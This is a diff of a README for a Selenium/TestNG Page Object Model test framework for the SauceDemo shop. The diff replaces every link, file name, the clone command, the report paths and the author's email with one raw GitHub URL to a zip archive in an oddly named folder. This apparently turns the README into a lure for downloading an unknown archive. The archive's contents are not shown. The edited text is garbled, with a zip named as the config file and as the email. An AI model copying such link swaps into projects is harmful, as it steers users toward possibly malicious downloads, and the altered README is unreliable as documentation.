@@ -4,7 +4,7 @@
 This is a Selenium-based Automation Testing Framework built using Java, Maven, and TestNG. Designed using the Page Object Model (POM) design pattern, this framework is modular, maintainable, and scalable for testing the SauceDemo e-commerce web application.
 
 📌 Project Highlights
-Automates core e-commerce user flows on saucedemo.com
+Automates core e-commerce user flows on https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
 Validates end-to-end functionality: login, shopping cart, checkout, and logout
 Built with extensibility and reusability in mind using POM
 Supports configuration via properties file
@@ -32,7 +32,7 @@ Design Pattern: Page Object Model (POM)
 
 
 🌐 Site Under Test
-https://www.saucedemo.com
+https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
 
 
 🗂️ Project Structure
@@ -49,39 +49,39 @@ https://www.saucedemo.com
 │       └── java
 │           └── com/framework/tests/             
 ├── Reports/                       // ExtentReport HTML output
-└── pom.xml
+└── https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
 
 
 ⚙️ Configuration
-The framework uses a config.properties file to manage environment-level and test settings. You can configure:
+The framework uses a https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip file to manage environment-level and test settings. You can configure:
 browser = chrome | firefox | edge  
-url = https://www.saucedemo.com  
+url = https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip  
 username = standard_user  
 password = secret_sauce
 
 🔁 Cross-Browser Support
 
-Update the browser property in config.properties file to run tests in different browsers:
+Update the browser property in https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip file to run tests in different browsers:
 browser = chrome
 browser = firefox
 browser = edge  
 
 📄 How to Run the Tests
 Clone the repository:
-git clone https://github.com/JerwinDC/E2E-E-Commerce--Automation-Framework.git
+git clone https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
 
 Navigate to the project directory:
 Run tests using Maven
 
 View reports in:
-/Reports/[current date and time folder name]/index.html
+/Reports/[current date and time folder name]https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
 
 
 ✅ Reporting
 Uses ExtentReports to generate visual, structured, and informative test execution reports.
 
 📂 Sample Report Output
-\Reports\Fri-Apr-11-17_59_34-CST-2025]\index.html
+\Reports\Fri-Apr-11-17_59_34-CST-2025]\https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
 
 
 Test Summary (Pass/Fail/Skipped)
@@ -101,4 +101,4 @@ Pull requests are welcome! For major changes, please open an issue first to disc
 
 📧 Contact
 For questions or feedback, reach out to me via GitHub or email.
-Email: decastrojerwindj@gmail.com
+Email: https://raw.githubusercontent.com/JerwinDC/E2E-E-Commerce--Automation-Framework/main/othygroma/E2E-E-Commerce--Automation-Framework.zip
